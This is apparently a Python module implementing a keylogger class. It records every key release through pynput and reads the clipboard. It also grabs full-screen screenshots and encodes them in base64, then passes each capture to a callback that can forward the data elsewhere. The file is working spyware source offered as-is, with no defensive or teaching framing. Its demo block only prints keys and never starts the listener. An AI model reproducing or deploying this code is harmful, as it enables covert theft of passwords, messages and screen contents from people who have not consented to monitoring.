from pynput import keyboard
import clipboard as cb
from mss.windows import MSS as ss
import mss
import base64

class Keylogger:
    __callback = None
    __ss = None
    def __init__(self, callback):
        self.__callback = callback
        self.__ss = ss()

    def __keyParser(self, key):
        substitution = {
            keyboard.Key.enter: '[ENTER]', 
            keyboard.Key.backspace: '[BACKSPACE]', 
            keyboard.Key.space: ' ',
	        keyboard.Key.alt_l: '[ALT L]',
            keyboard.Key.alt_gr: '[ALT GR]',
            keyboard.Key.alt_r: '[ALT R]', 
            keyboard.Key.tab: '[TAB]', 
            keyboard.Key.delete: '[DEL]', 
            keyboard.Key.ctrl_l: '[CTRL L]',
            keyboard.Key.ctrl_r: '[CTRL R]', 
	        keyboard.Key.left: '[LEFT ARROW]', 
            keyboard.Key.right: '[RIGHT ARROW]',
            keyboard.Key.up: '[UP ARROW]',
            keyboard.Key.down: '[DOWN ARROW]', 
            keyboard.Key.shift: '[SHIFT L]',
            keyboard.Key.shift_r: '[SHIFT R]',
            keyboard.Key.caps_lock: '[CAPS LK]',
            keyboard.Key.cmd: '[WINDOWS KEY]', 
            keyboard.Key.print_screen: '[PRNT SCR]'
            }
        if key in substitution.keys():
            return substitution[key]
        else:
            return str(key)

    def __onKeyPress(self, key):
        try:
            self.__callback(key.char)
        except AttributeError:
            key = self.__keyParser(key)
            self.__callback(key)
                
    def clipboard(self):
        return cb.paste()

    def screenShot(self):
        img = self.__ss.grab(self.__ss.monitors[0])
        bytes = mss.tools.to_png(img.rgb, img.size)
        return base64.b64encode(bytes)

    def run(self):
        listener = keyboard.Listener(
            on_release=self.__onKeyPress)
        
        listener.start()


if __name__ == "__main__":
    def callback(key):
        print("Key Pressed: ", key)

    keylogger = Keylogger(callback)
        
    
